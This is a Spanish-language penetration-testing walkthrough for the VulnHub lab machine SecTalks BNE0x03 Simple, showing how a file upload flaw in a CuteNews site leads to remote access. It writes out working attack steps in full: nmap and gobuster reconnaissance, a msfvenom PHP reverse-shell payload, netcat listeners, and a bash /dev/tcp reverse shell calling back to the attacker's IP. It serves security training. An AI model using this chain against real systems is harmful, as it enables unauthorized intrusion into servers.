# Explotación de vulnerabilidad File Upload

Maquinas a utilizar **Kali Linux y SecTalks: BNE0x03 - Simple (**[https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141))

Vamos a ver como podemos **crear un Payload malicioso y aprovechar una vulnerabilidad de subir archivos dentro de una pagina web** para poder **tener acceso remoto** en la maquina.

```bash
10.0.3.sudo arp-scan -I eth0 --localnet
```

```bash
ping -c 1 10.0.3.13
```

![image.png](./imagenes/image%2038.png)

```bash
nmap -p- -sS -sV -sC -min-rate 5000 -n -vvv -Pn 10.0.3.13
```

![image.png](./imagenes/image%2039.png)

Ponemos la IP en el navegador web

![image.png](./imagenes/image%2040.png)

Vemos un panel de inicio con la opción de registrarnos. Vamos a registrarnos.

![image.png](./imagenes/image%2041.png)

![image.png](./imagenes/image%2042.png)

**NOTA:** Cuando veamos un nombre o una marca lo investigamos en Metasploit con la opción “search: cutenews”.

Pulsamos en Personal options.

![image.png](./imagenes/image%2043.png)

Vemos que tenemos una opción para subir archivos. Entonces necesitaremos dos cosas el archivo malicioso y la ubicación donde se almacenen los archivos subidos.

- Vamos a generar el archivo malicioso.
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > pwned.php 
    ```
    
    ![image.png](./imagenes/image%2044.png)
    
    - **`p php/reverse_php`**: Especifica el tipo de payload. En este caso, se genera un payload de PHP que establece una conexión inversa (reverse shell) desde el objetivo hacia el atacante.
    - **`LHOST=10.0.3.4`**: Define la dirección IP del atacante (Local Host) que recibirá la conexión inversa.
    - **`LPORT=443`**: Especifica el puerto en el que el atacante escuchará la conexión. El puerto 443 es comúnmente utilizado para tráfico HTTPS, lo que puede ayudar a evadir detección.
    - **`f raw`**: Indica el formato del payload. Aquí se genera en formato "raw" (sin codificación adicional).
    - **`> pwned.php`**: Redirige la salida del payload generado a un archivo llamado `pwned.php`.
    
- Subimos el archivo malicioso a través del formulario
    
    ![image.png](./imagenes/image%2045.png)
    
- Vamos a hacer **Fuzzing Web** para saber donde se a subido el archivo. utilizaremos **la herrmienta Gobuster.**
    
    ```bash
    gobuster dir -u [http://10.0.3.13/](./imagenes/http://10.0.3.13/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%2046.png)
    
- En el navegador web.
    
    ![image.png](./imagenes/image%2047.png)
    
    Vemos que hay se encuentra el archivo malicioso que he subido anteriormente.
    
- Utilizamos **netcat** para ponernos a la escucha en el **puerto 443** que es el que hemos utilizado para nuestro archivo malicioso.
    
    ```bash
    nc -nlvp 443
    ```
    
    ![image.png](./imagenes/image%2048.png)
    

**NOTA:** El Payload en msfvenom funciona mal. Después de un rato fácilmente vamos a perder la conexión para evitar esto y tener una conexión mas estable aremos lo siguiente.

- Abrimos un nuevo terminal y nos ponemos a la escucha con netcat en un puerto diferente por ejempló 4444.
    
    ```bash
    nc -nlvp 4444
    ```
    
- En la pagina web [Online - Reverse Shell Generator](./imagenes/https://www.revshells.com/) ponemos la IP de nuestra Kali y puerto y copiamos el payload.
    
    ![image.png](./imagenes/image%2049.png)
    

- Abrimos otra terminal y lanzamos otro netcat escuchando el puerto 4444
    
    ![image.png](./imagenes/image%2050.png)
    

- Ejecutamos nuestro archivo malicioso
    
    ![image.png](./imagenes/image%2051.png)
    
    Miramos si funciona por ejemplo mirando que usuario soy.
    
    `whoami`
    
    Y ejecutamos el payload que habíamos copiado
    
    `bash -c "**sh** -i >& /dev/tcp/**10.0.3.4**/**4444** 0>&1"`
    
    ![image.png](./imagenes/image%2052.png)
    
    Vemos como **se abre una nueva conexión mucho mas estable** en la escucha del puerto 4444. Podríamos cerrar la terminal en la que escuchábamos por el puerto 443 sin ningún problema.
    
    ![image.png](./imagenes/image%2053.png)